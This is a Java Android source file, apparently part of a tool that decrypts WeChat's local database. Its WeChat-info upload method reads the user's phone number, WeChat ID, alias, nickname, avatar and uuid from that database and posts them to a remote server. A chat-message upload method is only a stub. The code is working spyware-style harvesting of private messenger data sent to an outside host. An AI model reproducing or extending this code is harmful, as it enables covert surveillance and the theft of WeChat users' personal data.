package com.wx.decrypt.request;

import android.graphics.Bitmap;

import com.wx.decrypt.network.okhttp.OkHttpUtils;
import com.wx.decrypt.request.callback.UploadWxInfoCallback;
import com.wx.decrypt.request.dto.ChatInfo;
import com.wx.decrypt.request.dto.WxInfo;
import com.wx.decrypt.constant.UrlConstant;
import com.wx.decrypt.util.UrlUtil;
import com.wx.decrypt.wxdb.EnMicroMsgDBManager;

/**
 * @author xutao
 */
public class WxRequestManager {

    private static volatile WxRequestManager mInstance;

    private WxRequestManager(){}

    public static WxRequestManager getInstance() {
        if (mInstance == null) {
            synchronized (WxRequestManager.class) {
                if (mInstance == null) {
                    mInstance = new WxRequestManager();
                }
            }
        }
        return mInstance;
    }

    /**
     * 上传wx用户自己信息
     *
     * uuid,手机号,微信号,微信号alias,昵称,头像
     */
    public void uploadWxInfo() {
       WxInfo info = EnMicroMsgDBManager.getInstance().getWxInfo();
       String url = UrlUtil.getUrl(UrlConstant.UPLOAD_WX_INFO);
       if (info != null && url != null) {
           OkHttpUtils.postJson().url(url)
                   .addParams("cellphoneNum", info.getPhoneNum())
                   .addParams("uuid", info.getUuid())
                   .addParams("wechatId", info.getWxId())
                   .addParams("wechatAlias", info.getAlias())
                   .addParams("headImg", info.getHeadImg())
                   .addParams("nickName", info.getNickName())
                   .build()
                   .execute(new UploadWxInfoCallback());
       }
    }

    /**
     * 上传微信聊天信息
     */
    public void uploadTalkMessage(ChatInfo chatInfo) {
        String info = chatInfo.getJsonString();
//        Bitmap bitmap;
//        bitmap.recycle();
    }

    ///////////////////////////////////////
    ////////////// volley测试方法
    ///////////////////////////////////////
    private void getBookInfo() {
//        WxRequestManagerV.getInstance().doUploadWxInfo(url, info, new Response.Listener<String>() {
//            @Override
//            public void onResponse(String bookDetailInfo) {
//                System.out.println("get bookinfo success");
//            }
//        }, new VolleyErrorListener() {
//            @Override
//            public void onErrorResponse(int sequence, String url, VolleyError error) {
//                System.out.println("get bookinfo error");
//            }
//        });
    }

}
